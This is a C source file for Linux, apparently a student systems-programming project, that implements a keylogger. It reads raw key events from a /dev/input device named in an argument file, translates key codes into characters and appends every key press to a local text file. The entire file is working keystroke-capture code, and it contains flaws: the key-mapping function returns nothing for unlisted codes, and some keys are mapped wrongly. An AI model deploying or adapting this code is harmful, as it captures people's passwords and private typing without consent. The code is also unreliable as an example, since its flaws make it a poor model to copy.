#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>

void INThandler()
{
    exit(0);
}

const char* mapping(int code)
{
    switch (code)
    {
    case 2:
        return "1";
        break;
    
    case 3:
        return "2";
        break;
    case 4:
        return "3";
        break;
    case 5:
        return "4";
        break;
    case 6:
        return "5";
        break;
    case 7:
        return "6";
        break;
    case 8:
        return "7";
        break;
    case 9:
        return "8";
        break;
    case 10:
        return "9";
        break;
    case 11:
        return "0";
        break;
    case 12:
        return "-";
        break;
    case 13:
        return "=";
        break;
    case 14:
        return "\n";
        break;
    case 15:
        return "\t";
        break;
    case 16:
        return "q";
        break;
    case 17:
        return "w";
        break;
    case 18:
        return "e";
        break;
    case 19:
        return "r";
        break;
    case 20:
        return "t";
        break;
    case 21:
        return "y";
        break;
    case 22:
        return "u";
        break;
    case 23:
        return "i";
        break;
    case 24:
        return "o";
        break;
    case 25:
        return "p";
        break;
    case 26:
        return "{";
        break;
    case 27:
        return "}";
        break;
    case 28:
        return "\n";
        break;
    case 29:
        return "\n";
        break;
    case 30:
        return "a";
        break;
    case 31:
        return "s";
        break;
    case 32:
        return "d";
        break;
    case 33:
        return "f";
        break;
    case 34:
        return "g";
        break;
    case 35:
        return "h";
        break;
    case 36:
        return "j";
        break;
    case 37:
        return "k";
        break;
    case 38:
        return "l";
        break;
    case 39:
        return ";";
        break;
    case 40:
        return "\'";
        break;        
    case 41:
        return "?";
        break;
    case 42:
        return "LEFTSHIFT";
        break;
    case 43:
        return "\\";
        break;
    case 44:
        return "z";
        break;

    case 45:
        return "x";
        break;

    case 46:
        return "c";
        break;

     case 47:
        return "v";
        break;

     case 48:
        return "b";
        break;

     case 49:
        return "n";
        break;  

     case 50:
        return "m";
        break;  
        
    case 54:
        return "RIGHTSHIFT";
        break;

    case 58:
        return "CAPSLOCK";
        break;

    case 51:
        return ",";
        break;

    case 57:
        return " ";
        break;

    default:
        break;
    }
}

int main(int argc, char *argv[])
{
    if(argc<=1)
    {
        printf("Nu stim care este event-ul\n");
        exit(-1);
    }  

    char event[20];
    FILE *rf = fopen(argv[1],"r");
    fscanf(rf,"%s",event);
    char devname[200] = "/dev/input/";
    strcat(devname, event);
    char storeFile[] = "/home/jipi/pso_project/store.txt";
    /*FILE *f = fopen(storeFile,"a");
    if(f==NULL)
    {
        printf("Eroare la deschiderea fisierului de output\n");
        exit(-1);
    }
    */
    int device = open(devname, O_RDONLY);
    struct input_event ev;

    signal(SIGINT, INThandler);

    while(1)
    {
        FILE *f = fopen(storeFile,"a");
        if(f==NULL)
        {
        printf("Eroare la deschiderea fisierului de output\n");
        exit(-1);
        }
        read(device, &ev, sizeof(ev));
        if(ev.type == 1 && ev.value == 1)
        {
            fprintf(f,"%s",mapping(ev.code));
        }
        fclose(f);
    }

    return 0;
}